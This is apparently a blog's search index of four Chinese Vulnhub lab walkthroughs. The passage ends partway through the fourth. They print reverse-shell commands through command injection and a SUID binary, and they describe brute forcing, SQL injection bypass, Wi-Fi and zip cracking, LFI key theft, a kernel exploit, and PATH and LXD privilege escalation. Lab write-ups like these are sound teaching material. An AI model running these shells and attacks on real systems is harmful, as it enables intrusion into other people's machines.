<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub靶机随笔-BOREDHACKERBLOG:CLOUD AV</title>
      <link href="/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BABOREDHACKERBLOG_CLOUD_AV%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BABOREDHACKERBLOG_CLOUD_AV%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub靶机-BOREDHACKERBLOG-CLOUD-AV详解"><a href="#Vulnhub靶机-BOREDHACKERBLOG-CLOUD-AV详解" class="headerlink" title="Vulnhub靶机 BOREDHACKERBLOG:CLOUD AV详解"></a>Vulnhub靶机 BOREDHACKERBLOG:CLOUD AV详解</h1><p>攻击机Kali  IP:192.168.3.44</p><p>靶机    IP:未知  系统:未知</p><p><strong>A.信息收集</strong></p><p><strong>扫描靶机存活性 确定IP地址</strong></p><p>1.命令:arp-scan -l</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/0cfa2f38883e4bd7bd0d8f6d4ff1d4ea.png" alt="img"></p><p><strong>扫描靶机开放端口及其服务版本信息</strong></p><p>2.命令 nmap -A -p- -sV 靶机IP地址</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/5930289baf004a788e003383b66688fc.png" alt="img"></p><p>3.两个开放端口,暂时不清楚什么漏洞,扫一下网站的后台子目录顺便访问网站继续搜集信息的同时msfconsole跑一下ssh弱口令</p><p>ssh弱口令:  无果<br> <img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/8eed09f2cb924578a08058f00ffca13b.png" alt="img"></p><p>子目录:  console scan 200     login output 405</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/f3aa45ff10844cc0bdef9b5b18cd3e1c.png" alt="img"></p><p>端口8080网站:</p><p>需要一个code 才能登录</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/d5f1e0b03ba04a828788434a0c2228c8.png" alt="img"></p><p>Console子目录:</p><p>需要一个pin码 才能够访问,可能后续 我们拿到shell可以获取这个pin码 先放着</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/48737aca8419436b8d46d020b1f0f706.png" alt="img"></p><p><strong>B.BurpSuit 截取流量 暴力破解</strong></p><p>1.打开我们的burpsuit先生,并且开启监听,截取流量,并发送到Inturder</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/93c9d1668405486f8e90c588d9596c1c.png" alt="img"></p><p>2.在Intruder模式给password的参数添加两个符号</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/1b3913724ffc42c7b1895bf161f7447b.png" alt="img"></p><p>3.这有两种思路</p><p>​    1)SQL注入</p><p>这里填入的是SQL注入万能密码</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/830306e02cf94a5d971e33f0d64a3230.png" alt="img"></p><p><strong>可以看到,有这么几个密码都是可以轻松绕过的</strong></p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/f0ab95c730f643edb27521fa21d0b84f.png" alt="img"></p><p>​    2)弱口令爆破</p><p>这里填入的是弱口令字典</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/8b11e67f943f479d9bec712059b7f48b.png" alt="img"></p><p>密码为password</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/ec56cc5596f7470f9dc1e82f0c9e39e6.png" alt="img"></p><p><strong>C.瑞士军刀</strong></p><p>登陆成功后:  这是一个病毒扫描的云服务,需要填入对应的文件名,第一感觉就是命令注入,我们随便试一个 cat | id 或 cat &amp; id</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/d6aa3e8b84df4a41b2ab529c8011a9b3.png" alt="img"></p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/b8e617468d4947be96fde8521c02f764.png" alt="img"></p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/b503d1a8c1da4c0681f45dfa07a037d9.png" alt="img"></p><p>果不其然,直接上瑞士军刀吧 也可以用python的反弹shell代码,因为网站版本是python2.7,但是回显或有点慢,所以我选择瑞士军刀</p><p>命令: cat | echo ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机IP&#x2F;攻击机开放port 0&gt;&amp;1’|bash</p><p>我用的命令: cat | echo ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.44&#x2F;4444 0&gt;&amp;1’|bash</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/d5f2ab632ca84739bbdd82d226dc74a8.png" alt="img"></p><p><strong>D.提权</strong></p><p>1.查看当前目录文件</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/4afbd87590c14cf4b674a314ff7e47d0.png" alt="img"></p><p>这有个database.sql 我们查看一下他的文件类型 发现是sqlite文件 这就很关键了很有可能里面有用户名和密码</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/04893627197d44d4a36188ef61a38191.png" alt="img"></p><p><em>简短做个补充:</em></p><p>​    <em>SQLite是一个进程内的轻量级嵌入式数据库，它的数据库就是一个文件，实现了自给自足、无服务器、零配置的、事务性的SQL数据库引擎。它是一个零配置的数据库，这就体现出来SQLite与其他数据库的最大的区别：SQLite不需要在系统中配置，直接可以使用。且SQLite不是一个独立的进程，可以按应用程序需求进行静态或动态连接。SQLite可直接访问其存储文件。</em></p><p>将此文件 通过nc传到我们的攻击机上</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/0df41452df3c4a82a6661031eb1d348f.png" alt="img"></p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/bc21f4e8ed8a4fa1bf8830c870dd6f20.png" alt="img"></p><p>运行sqlite3</p><p>命令:   .open data.sql    &#x2F;&#x2F;打开数据库</p><p>​       .databse        &#x2F;&#x2F;当前数据库名</p><p>​       .dump         &#x2F;&#x2F;查看当前数据库数据</p><p>得到四个疑似密码</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/e7a4b24a635141a7b8996daf1fc4bf2e.png" alt="img"></p><p>接着 查看一下&#x2F;etc&#x2F;passwd文件里有哪几个用户可以登录</p><p>Root cloudav scanner</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/0a52c32f13e54555ae8fd4a3fc1eb8eb.png" alt="img"></p><p>将用户名写入一个文件user.txt 将密码也写入一个文件password.txt 利用hydra进行爆破</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/7f94f56bccae464cb373ae8127c137f2.png" alt="img"></p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/8db46f32e88a42d0a3570f4220969cf6.png" alt="img"></p><p>被摆了一道,密码或许就是个幌子……</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/5d5f42fc1c2e4f17935bacf415f64095.png" alt="img"></p><p>2.别放弃,继续挨个翻目录文件,在&#x2F;home&#x2F;scanner下有几个特殊文件</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/c4fdd7f5746d48ef89fa79a3bf696508.png" alt="img"></p><p>一个像是编译好的文件,一个源码</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/61ef2df76a694f3a9f6571218dcf50b4.png" alt="img"></p><p>3.查看一下文件权限  发现是可执行文件且权限为4000</p><p>4.一下就来劲了,查看一眼他的源码</p><p>程序大致意思是</p><p>传入一个argc 一个指针数组*argv[]</p><p>如果argc小于2 就会返回一段话</p><p>如果argc大于2 就会执行命令</p><p>所以我大胆猜测这又是一个命令行注入</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/cb3646cc46584a5cb49273b9a56d7057.png" alt="img"></p><p>运行程序 添加参数”3 | id ” 实际运行下来好像1也可以 我暂时不管了 C这一块忘记了    程序能跑起来就行</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/375076d7cd1d4b4b8b65ce18e1d889c4.png" alt="img"></p><p>这里用到的思路是    nc串联</p><p>命令:.&#x2F;update_cloudav “3 | nc 攻击机IP 攻击机第一个PORT | &#x2F;bin&#x2F;bash | nc 攻击机IP 攻击机第二个PORT”</p><p>我的命令: .&#x2F;update_cloudav “3 |nc 192.168.3.44 7777 |&#x2F;bin&#x2F;bash |nc 192.168.3.44 9999”</p><p>成功提权</p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/8fa83b81a0034f0e8e942935036cdad9.png" alt="img"></p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/d792e5a89b26477a8edc252490e04188.png" alt="img"></p><p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/2110bf050f1744e085a70bb1104b8917.png" alt="img"></p><p>*<strong>提剑跨骑挥鬼雨，白骨如山鸟惊飞。*</strong></p><p>*<strong>尘事如潮人如水，只叹江湖几人回。*</strong></p><p><strong>好了,到这我们的文章真的结束了,有不懂的可以私信我</strong></p><p><strong>你们的点赞和关注是我更新的动力,让我们一起努力~~</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机随笔-Thr0ll</title>
      <link href="/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BAThr0ll%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BAThr0ll%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub靶机Thr0ll详解"><a href="#Vulnhub靶机Thr0ll详解" class="headerlink" title="Vulnhub靶机Thr0ll详解"></a>Vulnhub靶机Thr0ll详解</h1><p>攻击机Kali  IP:192.168.3.44</p><p>靶机    IP:未知  系统:未知</p><p><strong>A.信息收集</strong></p><p><strong>扫描靶机存活性 确定IP地址</strong></p><p>1.命令:arp-scan -l</p><p><img src="/../Vulnhub/Thr0ll/1cb5fb32fcc147e1964abc6febed725c.png" alt="img"><br><strong>扫描靶机开放端口及其服务版本信息</strong></p><p>2.命令 nmap -A -p- -sV 靶机IP地址</p><p><img src="/../Vulnhub/Thr0ll/d5eae459664342a98127d5ab17ec796e.png" alt="img"></p><p>通过nmap我们扫描到靶机开放了21ftp端口,22ssh端口以及80web端口,且ftp允许匿名用户(anonymous)登录,网站存在robots协议,以及几个子目录</p><p>&#x3D;&#x3D;网站robots协议中允许访问子目录&#x2F;secret</p><p><img src="/../Vulnhub/Thr0ll/f12baf7df9164edc96136f4dfbe27ece.png" alt="img"></p><p>通过访问子目录&#x2F;secret可以发现 并没有什么有用线索</p><p><img src="/../Vulnhub/Thr0ll/34a59fb5caff469e8e3b5362ba41b2a8.png" alt="img"></p><p>&#x3D;&#x3D;匿名登陆ftp服务,发现存在一个lol.pcap流量包,我们将其down下来,利用wireshark打开,寻找新的有利信息</p><p><img src="/../Vulnhub/Thr0ll/69bb05b3d19247ceaac13f58b9bbd978.png" alt="img"></p><p><strong>B. Wireshark流量包</strong></p><p>整个流量包呢 就只有三种协议 tcp ftp以及ftp-data</p><p><img src="/../Vulnhub/Thr0ll/6de2e71ca39a4cc8a0feff22c1ec2410.png" alt="img"></p><p>前面一块基本就是ftp的登陆,再往后面翻发现这个人去下载了一个名为secret_stuff的txt文件,里面包含里一些重要信息</p><p><img src="/../Vulnhub/Thr0ll/6436c0f4e724479b83c20804371357fd.png" alt="img"></p><p>大致就是告诉我们有一个隐藏子目录,名字就是sup3rs3cr3tdirlol</p><p><img src="/../Vulnhub/Thr0ll/2ff41bd5b4674f3e8d90b882c5e931c5.png" alt="img"></p><p>直接访问,里面就有个文件,把他down下来,进行分析</p><p><img src="/../Vulnhub/Thr0ll/eb2dad71b5e74ef5ab892386b7cd2225.png" alt="img"></p><p>利用file命令 可以得出这是个elf可执行文件</p><p><img src="/../Vulnhub/Thr0ll/99529da8949146f99889342021a9a4db.png" alt="img"></p><p>利用工具strings,分析一下这个文件内部的字段</p><p><img src="/../Vulnhub/Thr0ll/1efdf7b249ba42bc822fff282f30565b.png" alt="img"></p><p><img src="/../Vulnhub/Thr0ll/30f903b1bd404d4091cfa8b695fcd93b.png" alt="img"></p><p>一直提示找到一个地址 0x0856BF,难道嗦?</p><p>对,这也是个子目录名</p><p>访问一下</p><p><img src="/../Vulnhub/Thr0ll/309883cab4834704bc161c23883efe2b.png" alt="img"></p><p>有两个文件,挨个打开寻找有利信息</p><p>Good_luck:</p><p><img src="/../Vulnhub/Thr0ll/3c874e6901ee4bfe8490c38060c0fbf7.png" alt="img"></p><p><img src="/../Vulnhub/Thr0ll/91ba4fffcc0e48e89cd9741f670e83c0.png" alt="img"></p><p>不难猜出,这就是个用户名字典</p><p>后面一个文件夹就有趣了,首先我们先看他的目录文件名</p><p>This_folder_contains_the_password</p><p><img src="/../Vulnhub/Thr0ll/a944c9ec1dc44931b60f2fbdaeca3df8.png" alt="img"></p><p><img src="/../Vulnhub/Thr0ll/be64fff33a6e46f0ab40499fb126d00d.png" alt="img"></p><p><img src="/../Vulnhub/Thr0ll/40c93c8931cb4c1f8550ebe6297305ed.png" alt="img"></p><p>猜到了吗,是不是感觉被骗了?</p><p>上工具 hydra,靶机一共开放了两个可登录服务,ssh以及ftp</p><p>挨个爆破</p><p><img src="/../Vulnhub/Thr0ll/827f268d57814127a9799ab3ad2c1a84.png" alt="img"></p><p>Xdm,看清楚了这里是小写p,也就是说密码就是他的文件名字,Pass.txt</p><p><strong>C. 提权</strong></p><p>首先利用ssh登录用户overflow</p><p><img src="/../Vulnhub/Thr0ll/4027b11293414632b901e79800e89502.png" alt="img"></p><p>这里就不卖关子了,提权采用的是内核提权</p><p>SO,先收集一下靶机的内核版本以及发行版本</p><p><img src="/../Vulnhub/Thr0ll/afe23882fcf5425a9c72f1d0cffe3cf3.png" alt="img"></p><p>直接找漏洞脚本,利用searchsploit</p><p><img src="/../Vulnhub/Thr0ll/a457b97f03d14b54b54457f1f73d1004.png" alt="img"></p><p>这个37292.c的脚本 太符合要求了,so直接拷贝到靶机上,这里我是将当前目录发布出去,靶机wget下载,gcc编译一下,直接获取到root权限,豪取flag</p><p><img src="/../Vulnhub/Thr0ll/a13b65dbd03a49a986b7f5efdadb3fdb.png" alt="img"></p><p><img src="/../Vulnhub/Thr0ll/46d4db2a7b1e464abb8251d75f117132.png" alt="img"></p><p>这个靶机还是挺简单的,我写的过于粗糙,整个流程中有问题的话随时来问我</p><p>*<strong>*<em>纵有千古，横有八荒。**</em></strong></p><p>*<strong>*<em>前途似海，来日方长。**</em></strong></p><p><strong>好了,到这我们的文章真的结束了,有不懂的可以私信我</strong></p><p><strong>你们的点赞和关注是我更新的动力,让我们一起努力~~</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机随笔-OS-ByteSec</title>
      <link href="/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BAOS-ByteSec%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BAOS-ByteSec%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub靶机OS-ByteSec详解"><a href="#Vulnhub靶机OS-ByteSec详解" class="headerlink" title="Vulnhub靶机OS-ByteSec详解"></a>Vulnhub靶机OS-ByteSec详解</h1><p>攻击机Kali  IP:192.168.1.110</p><p>靶机Os-ByteSec IP:未知  系统:未知</p><p><strong>A.扫描靶机存活性    确定IP地址</strong></p><p>1.命令:arp-scan -l</p><p><img src="/Vulnhub/OS-ByteSec/6e81942d2a814c6ea0f8b4d22857a6b1.png" alt="img"></p><p><strong>B.扫描靶机开放端口及其服务版本信息</strong></p><p>1.命令:nmap -A -p- -sV 192.168.1.110</p><p><img src="/Vulnhub/OS-ByteSec/8601f5f37b2e49078172c50c6ec5e59d.png" alt="img"></p><p>2.靶机的80端口由apache搭建,139和445端口是smb服务,且版本在3.x-4.x之间,这个版本是存在smb远程shell命令行注入的[CVE-2007-2447],ssh端口更改为2525</p><p>3.咱们先上网站看看有无可用信息</p><p><img src="/Vulnhub/OS-ByteSec/c934512cdb814924a936209581c705c6.png" alt="img"></p><p>不知道是不是还在提示我们,存在smb漏洞</p><p><strong>C.SMB渗透</strong></p><p>1.直接上老朋友MSFCONSOLE,搜索编号cve-2007-2447,或者直接搜索samba,找到usermap_script</p><p><img src="/Vulnhub/OS-ByteSec/d3e0cdd6461a461a91a62211d7a4cc55.png" alt="img"></p><p><img src="/Vulnhub/OS-ByteSec/4127cc9a22454d5bb94a1ff34ff5de07.png" alt="img"></p><p>2.很显然失败了,但是咱们还有工具enum4linux 简单做个介绍:</p><p><img src="/Vulnhub/OS-ByteSec/67f1c2b68871433bb41fe47a2d68d662.png" alt="img"></p><p><img src="/Vulnhub/OS-ByteSec/af330a69ee8d41f48b8e2f068e838f91.png" alt="img"></p><p><img src="/Vulnhub/OS-ByteSec/fbedf5cb9bef4c458970d6b3204c1a1f.png" alt="img"></p><p>可以看到这边有三个用户,sagar,blackjax,smb,至于密码…</p><p>3.尝试尝试弱口令</p><p><img src="/Vulnhub/OS-ByteSec/cd34fcc6be094681b0552a50c78b97a7.png" alt="img"></p><p>功夫不负有心人,很侥幸的让我猜到了密码是” ” 对,就是空密码,咱们把这两个文件都下载下来,看看到底怎么个事</p><p>使用命令get 文件名1 文件名2</p><p><img src="/Vulnhub/OS-ByteSec/8fae69ca7521415fb6674388f8f68c86.png" alt="img"></p><p><img src="/Vulnhub/OS-ByteSec/034fcfda6e36499eb82d09968f99d809.png" alt="img"></p><p><img src="/Vulnhub/OS-ByteSec/a33c6e1f82724a6e91959b75205733c2.png" alt="img"></p><p>这里由于写文章之前我下载过压缩包,有点冲突,我把它重新下载到&#x2F;tmp目录下</p><p><img src="/Vulnhub/OS-ByteSec/5faf4e307ced47ed9447a54d9a7e28d6.png" alt="img"></p><p>这作者真有一手,又给压缩包加密了,咱们再一次掏出大宝贝开膛手杰克:zip2john以及john</p><p>使用命令:zip2john 加密的压缩包 &gt; pass &amp;&amp; john pass</p><p><img src="/Vulnhub/OS-ByteSec/f4155ff9d9e344f6acf308d246a8d876.png" alt="img"></p><p>我这里是因为之前破解过了,所以使用命令 john –show pass</p><p><img src="/Vulnhub/OS-ByteSec/8b6fde3a3fed42ba841164bd827a7d26.png" alt="img"></p><p>第二位就是压缩包密码:hacker1</p><p>使用命令:unzip safe.zip</p><p><img src="/Vulnhub/OS-ByteSec/cdd671ed93654999acf7f6169fa750bb.png" alt="img"></p><p>得到一个图片,一个流量包</p><p>给老铁们看看图片,暂时没什么用</p><p><img src="/Vulnhub/OS-ByteSec/310addacbee64815b33b1ff28e35bdb9.png" alt="img"></p><p>4.看看流量包</p><p>使用命令:wireshark user.cap</p><p><img src="/Vulnhub/OS-ByteSec/7e8da0b2a03441a3b48cdddafcf4779e.png" alt="img"></p><p>这显然是个无线数据包,继续掏工具 aircrack-ng,一款用于无线网络渗透的神器</p><p>使用命令:aircrack-ng -w 字典 user.cap     这里就用rockyou,kali自带的,省事方便</p><p><img src="/Vulnhub/OS-ByteSec/9e9077358922415e863c96af6a0790b2.png" alt="img"></p><p>5.得到一个wifi用户blcak,以及wifi密码snowflake,这里就要脑洞大开了,让我们把时间退回到刚开始扫描端口,有一个ssh服务端口为2525,有点像”撞库”,这个wifi用户和密码或许可以利用ssh获取shell</p><p><img src="/Vulnhub/OS-ByteSec/19ca48ecd0964c208918cc9ee4b45fc6.png" alt="img"></p><p><img src="/Vulnhub/OS-ByteSec/483d97a88649433592135f97ecb13746.png" alt="img"></p><p>成功获取第一个flag,并且提示我们GO TO Root</p><p>我们的文章到这才刚刚进入重点,请继续往下看</p><p><strong>D.提权</strong></p><p>1.进行一些常规的提权姿势</p><p><img src="/Vulnhub/OS-ByteSec/f0bfb8329d63431aa5466b118f5a4a45.png" alt="img"></p><p>Sudo失败</p><p><img src="/Vulnhub/OS-ByteSec/c9689d6f60bf4b028e872ca924bc2714.png" alt="img"></p><p>这有个很可疑的可执行文件,我们调用这个命令试试</p><p><img src="/Vulnhub/OS-ByteSec/a1d6c447733e402783901b62b67b34b3.png" alt="img"></p><p>????,其实做到这的时候,我已经觉得有戏了,下面是我在kali上的演示,这两张图是不是神似,没错靶机上的&#x2F;usr&#x2F;bin&#x2F;netscan 就是使用了netstat -antp命令</p><p>如有疑问,可以用scp把netscan远程复制到自己的攻击机上,然后再用strace命令去看看这个netscan到底做了什么,我的kali没装strace就不演示了,结果一定是netstat -antp</p><p><img src="/Vulnhub/OS-ByteSec/c280f66b6ff64d30991bad17fa46da1a.png" alt="img"></p><p>2.咱们继续,这里又要用到一种提权姿势PATH提权</p><p>PATH是Linux和类Unix操作系统中的环境变量，它指定可执行程序的所有bin和sbin存储目录。当用户在终端上运行任何命令时，它会向shell发送请求以在PATH变量中搜索可执行文件来响应用户执行的命令。超级用户通常还可以使用&#x2F;sbin和&#x2F;usr&#x2F;sbin以便于执行系统管理的命令。</p><p>3.我做个简单的演示</p><p><img src="/Vulnhub/OS-ByteSec/64aaa6962c2440de9c16e4ac8af83add.png" alt="img"></p><p>我在&#x2F;tmp&#x2F;test目录创建一个c语言文件,作用就是调用系统命令”ls”</p><p>接着用gcc编译文件到shell,给shell赋予u+s权限</p><p><img src="/Vulnhub/OS-ByteSec/96d79d5a43e14bcc9a83265e108c3bf5.png" alt="img"></p><p>这个时候我换一台设备,能够ssh登录到我的kali用户,紧接着下面的操作,这里使用的是大佬的文章<a href="https://www.anquanke.com/post/id/146799">利用 PATH 环境变量进行 Linux 提权-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><img src="/Vulnhub/OS-ByteSec/d930ebe0dd8d4035a67075b59ce1954f.png" alt="img"></p><p>4.回到靶机,举一反三</p><p><img src="/Vulnhub/OS-ByteSec/a5dc213cfcdf4e1fb5b49fb40294163d.png" alt="img"></p><p><img src="/Vulnhub/OS-ByteSec/4707bb732f4a47e6a9e852d5081bd3d5.png" alt="img"></p><p>嗯,当是我也很诧异,可以再看看上面那篇大佬的文章</p><p><em><strong>天下风云出我辈，一入江湖岁月催。&#x2F;</strong></em></p><p><em><strong>皇图霸业谈笑中，不胜人生一场醉。&#x2F;</strong></em></p><p><strong>好了,到这我们的文章真的结束了,有不懂的可以私信我</strong></p><p><strong>你们的点赞和关注是我更新的动力,让我们一起努力~~</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机随笔-CYNIX_1</title>
      <link href="/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BACYNIX_1%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BACYNIX_1%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub靶机CYNIX-1详解"><a href="#Vulnhub靶机CYNIX-1详解" class="headerlink" title="Vulnhub靶机CYNIX_1详解"></a>Vulnhub靶机CYNIX_1详解</h1><p>攻击机Kali  IP:192.168.3.44</p><p>靶机    IP:未知  系统:未知</p><p><strong>A.信息收集</strong></p><p><strong>扫描靶机存活性 确定IP地址</strong></p><p>1.命令:arp-scan -l</p><p><img src="/Vulnhub/Cynix/f86abc8f9b124d50adb402f73083c47a.png" alt="img"></p><p><strong>扫描靶机开放端口及其服务版本信息</strong></p><p>2.命令 nmap -A -p- -sV 靶机IP地址</p><p><img src="/Vulnhub/Cynix/362d3adc26ef407baf38795b27945042.png" alt="img"></p><p><img src="/Vulnhub/Cynix/8f4a6be4b06a4d87b57ca70fca99d4fc.png" alt="img"><br>3.靶机开放两个端口:  80web网站, 6688ssh端口 按照惯例先访问网站搜集信息,同时爆破子目录名</p><p>4.网站主目录就是apache的主目录,没有可利用价值</p><p><img src="/Vulnhub/Cynix/e09aeda1d5524d64a297177f5447e4e6.png" alt="img"></p><p>5.网站子目录爆破 dirb和dirsearch常规工具字典都跑不出有用目录,尝试暴力工具gobuster,外加字典&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt 万事俱备,爆破!<br>选项解析:</p><p>​       -u     目标URL</p><p>​       -w     字典</p><p>​       -x      要搜索的文件扩展名</p><p><img src="/Vulnhub/Cynix/cdf641ed77b34a3690c51cd861f0c26c.png" alt="img"></p><p>6.得到一个隐藏子目录lavalamp,直接访问</p><p>页面就长这样:</p><p><img src="/Vulnhub/Cynix/e6553353c45c4722806f08062338b9cb.png" alt="img"></p><p>7.挨个翻阅点击之后,找到一个可疑点</p><p>当问提交之后,上方会多出一个空白处</p><p><img src="/Vulnhub/Cynix/fef4f398152247d99f55b046b63c0385.png" alt="img"></p><p>8.这可不是我画出来的,学过html的同学一眼就能看出这里面暗藏玄机,没学过的同学也没事,看下一张图片</p><p><img src="/Vulnhub/Cynix/160a56dc6b124950b1c1479008ac1820.png" alt="img"></p><p>9.中间存在一个按钮,并且可以提交</p><p><img src="/Vulnhub/Cynix/9be5ab1972654f1db734d6275b419e5c.png" alt="img"></p><p><strong>B.Burpsuit 流量截取</strong></p><p>1.首先挂上代理 开启监听 然后重新提交一份表单 将截取到的流量发送到repeater模块</p><p><img src="/Vulnhub/Cynix/9dfdbbba46b04c3d973888a42844bb63.png" alt="img"></p><p>2.在repeater模块下,点击send发送,然后在render加载一下网页,如果加载不出,可以修改一下设置,将下列选项勾选上即可</p><p><img src="/Vulnhub/Cynix/3d93fb8234e54662a920cdb2da364c5c.png" alt="img"></p><p><img src="/Vulnhub/Cynix/12638ee1dd744f18abe938d1ace63f7c.png" alt="img"></p><p>3.我们copy一下URL,打开开发者模式(F12),在网页瞎点点,果真在先生的头部存在一个按钮,只不过被设置了透明,我们将其显现出来:将框框里的参数改为1.0即可</p><p><img src="/Vulnhub/Cynix/3e26ad8f6dc644d5989ecd7e0c66ee12.png" alt="img"></p><p>4.开启监听,随便输入并提交,这里看到参数是file,感觉很有可能存在LIF漏洞</p><p><img src="/Vulnhub/Cynix/6720b1d2ff7c4d9bb733467e156271e2.png" alt="img"></p><p>5.好像被过滤掉了,既然他不仁也不能怪我们不义,直接绕过,最简单的当然是上fuzz字典去爆破,我这里是误打误撞,碰到了a就被我绕过了O.o</p><p><img src="/Vulnhub/Cynix/91930786c84e48e08f91d8667aaaf013.png" alt="img"></p><p>绕过!</p><p><img src="/Vulnhub/Cynix/88e4c471ade640b6af7f38d6e042259f.png" alt="img"></p><p><img src="/Vulnhub/Cynix/e319646a89b44496ade2ff6679cff023.png" alt="img"></p><p>6.得到一个可登录用户ford,还记得靶机开放了另一个端口6688吗,正是ssh端口,开连!</p><p><img src="/Vulnhub/Cynix/50ec15d54d0845209b4092cf0d30f9a3.png" alt="img"></p><p>7.上图表示 靶机关闭了密码登录,所以我们或许需要一个私钥</p><p>补充一下:私钥一般和公钥在一起,理论上都放在用户的家目录中</p><p>那么…你懂的</p><p><img src="/Vulnhub/Cynix/4f27e8a04a5c49a3b33e386982187ea8.png" alt="img"></p><p>8.copy上面的私钥,通过私钥进行ssh连接</p><p>这里别忘了给私钥赋予合理的权限,不然不让连哈哈</p><p><img src="/Vulnhub/Cynix/af39687ed0d148c5a3ad3f55ed5cea3a.png" alt="img"></p><p>9.获取第一个flag</p><p><img src="/Vulnhub/Cynix/378c99a7926344a69a1ec9f9ad4133d8.png" alt="img"></p><p><strong>C. 提权</strong></p><p>1.这里就不卖不关子了,一开始我尝试常见的提权姿势我没发现什么可用的地方,可能是我眼神不太好,所以我觉得直接跑工具稳妥 LinEnum.sh</p><p>链接:<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p><img src="/Vulnhub/Cynix/88639dcd63364615955802de327fcb19.png" alt="img"></p><p>2.把LinEnum.sh的当前目录利用python发布出去,靶机下载LinEnum.sh脚本,赋予执行权限,然后就开跑</p><p><img src="/Vulnhub/Cynix/0f36e98d68be4ae786ae1cc2bd9da465.png" alt="img"></p><p><img src="/Vulnhub/Cynix/550e482e510e4dbf8f7ef1c214b28ef9.png" alt="img"></p><p>我说我眼神不好,没意见吧,了解lxc,lxd,docker容器的,可能会更明白一点</p><p><img src="/Vulnhub/Cynix/905641a7e927422fac5addac45f46a21.png" alt="img"></p><p><em>做个简短的补充:</em></p><p><em>LXD**、LXC 和 Docker 是三种不同的容器化技术，它们在实现和使用上有一些区别。</em></p><p><em>总结来说，LXD是基于LXC的系统级容器管理器，提供了更高级别的接口和管理工具；LXC是Linux内核提供的一种虚拟化技术，允许在单个Linux内核上运行多个隔离的用户空间实例；而Docker是基于LXC的容器化平台，提供了一套简化容器构建、分发和运行的工具和API。</em></p><p><em>Lxd**提权原理:</em></p><p><em>LXD</em> <em>是基于 LXC 容器的管理程序，当前用户可操作容器。所以用户可创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。</em></p><p><em>LXD</em> <em>提权条件: 已经获得 shell 用户属于 lxd 组</em></p><p>3.查看镜像列表</p><p>命令:lxc image list</p><p><img src="/Vulnhub/Cynix/62fe695929a742d0bfbed1586f9829cc.png" alt="img"></p><p>4.按照实际情况来说,需要创建一个特权镜像,但往往会失败,所以这里选择在kali生成镜像,然后复制到靶机上面</p><p>先在kali上面下载alpine</p><p>命令:git clone <a href="https://github.com/saghul/lxd-alpine-builder.git">GitHub - saghul&#x2F;lxd-alpine-builder: Build Alpine Linux images for LXD</a></p><p>接着生成镜像,如下:</p><p><img src="/Vulnhub/Cynix/4fdfbd62c47845eea9de191e7db864bf.png" 